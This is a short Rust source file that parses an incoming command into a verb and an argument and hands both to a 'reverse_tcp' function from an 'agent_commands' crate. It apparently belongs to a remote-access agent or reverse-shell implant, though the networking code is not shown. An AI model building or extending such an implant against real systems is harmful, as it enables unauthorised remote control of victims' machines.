extern crate agent_commands;

use snailquote::unescape;
use agent_commands::*;

pub fn process_cmd(cmd: String) -> String {

    //println!("{:#?}", cmd);

    let cmd_request = cmd
        .split_whitespace()
        .next()
        .unwrap_or("");
    let cmd_request = cmd_request.trim_matches(char::from(0));

    let cmd_arg = cmd.replace(cmd_request, "");
    let cmd_arg = cmd_arg.trim_matches(char::from(0));
    
    reverse_tcp(cmd_request.to_string().to_uppercase(), cmd_arg.to_string())
}
